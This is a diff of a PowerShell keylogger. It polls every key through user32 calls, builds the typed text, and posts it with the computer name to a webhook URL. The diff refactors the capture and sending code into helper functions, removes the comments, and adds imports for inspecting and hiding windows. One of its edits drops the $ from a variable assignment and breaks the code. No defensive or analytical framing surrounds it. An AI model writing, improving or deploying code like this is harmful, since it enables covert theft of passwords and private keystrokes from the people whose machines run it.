@@ -47,16 +47,62 @@ Nimble â€“ Quick and light in movement or action.
 
 #>
 
+Function SendWH {
+      $Escaped = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+      $escmsg = $timestamp+" : "+'`'+$Escaped+'`'
+      $JsonWrapper = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
+      IRM -Uri $dc -Method Post -ContentType "application/json" -Body $JsonWrapper
+}
+
+Function isKey {
+        $iskeyPressed = $true
+        $LastpressTime.Restart()
+        $null = [console]::CapsLock
+        $vtkey = $defs::MapVirtualKey($Collected, 3)
+        $kbst = New-Object Byte[] 256
+        $checkState = $defs::GetKeyboardState($kbst)
+        SaveCharacter = New-Object -TypeName System.Text.StringBuilder  
+}
+
 $defs = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+
+public class User32 {
+    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+    public static extern short GetAsyncKeyState(int virtualKeyCode);
+
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int GetKeyboardState(byte[] keystate);
+
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int MapVirtualKey(uint uCode, int uMapType);
+
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);
+
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetForegroundWindow();
+
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern int GetWindowTextLength(IntPtr hWnd);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    [DllImport("user32.dll")]
+    public static extern bool IsWindowVisible(IntPtr hWnd);
+}
 '@
+
 $defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru
 
 $LastpressTime = [System.Diagnostics.Stopwatch]::StartNew()
@@ -66,27 +112,16 @@ While ($true){
   $iskeyPressed = $false
     try{
       while ($LastpressTime.Elapsed -lt $Threshold) {
-      Start-Sleep -Milliseconds 30
+      Sleep -M 30
         for ($Collected = 8; $Collected -le 254; $Collected++){
         $keyst = $defs::GetAsyncKeyState($Collected)
-          # If a key is pressed
           if ($keyst -eq -32767) {
-          # Restart the inactivity timer
-          $iskeyPressed = $true
-          $LastpressTime.Restart()
-          $null = [console]::CapsLock
-          # Translate the keycode to a letter
-          $vtkey = $defs::MapVirtualKey($Collected, 3)
-          $kbst = New-Object Byte[] 256
-          $checkState = $defs::GetKeyboardState($kbst)
-          $SaveCharacter = New-Object -TypeName System.Text.StringBuilder
-            # Define the key that was pressed          
+		isKey         
             if ($defs::ToUnicode($Collected, $vtkey, $kbst, $SaveCharacter, $SaveCharacter.Capacity, 0)) {
               $LoggedString = $SaveCharacter.ToString()
                 if ($Collected -eq 8) {$LoggedString = "[BACKSP]"}
                 if ($Collected -eq 13) {$LoggedString = "[ENTER]"}
                 if ($Collected -eq 27) {$LoggedString = "[ESC]"}
-            # Add the key to sending variable
             $send += $LoggedString 
             }
           }
@@ -95,19 +130,12 @@ While ($true){
     }
     finally{
       If ($iskeyPressed) {
-      # Send the saved keys to a webhook
-      $Escaped = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
-      $escmsg = $timestamp+" : "+'`'+$Escaped+'`'
-      $JsonWrapper = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
-      IRM -Uri $dc -Method Post -ContentType "application/json" -Body $JsonWrapper
-      #Remove log file and reset inactivity check 
+      SendWH
       $send = ""
       $iskeyPressed = $false
       }
     }
-  # reset stopwatch before restarting the loop
   $LastpressTime.Restart()
-  Start-Sleep -Milliseconds 10
+  Sleep -M 10
 }
 
